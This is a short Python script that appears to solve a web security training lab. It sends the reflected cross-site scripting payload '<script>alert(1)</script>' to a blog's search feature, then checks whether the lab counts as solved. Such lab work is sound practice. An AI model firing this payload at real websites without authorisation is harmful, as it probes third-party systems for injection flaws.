import sys
import logging
import argparse
import urllib3

import requests

from utils import utils   # script written by @tjc_  https://youtu.be/YYsZpJ83azQ
from utils.blog import Blog


log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}][{name}] {message}",
    style="{",
    datefmt="%H:%M:%S",
)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



def main(args):
	blog = Blog(args.url, args.no_proxy)
	blog.search("<script>alert(1)</script>")
	# print(resp.text) ## debugging
	blog.is_solved()
	
	
if __name__ == "__main__":
    args = utils.parse_args(sys.argv)
    main(args)
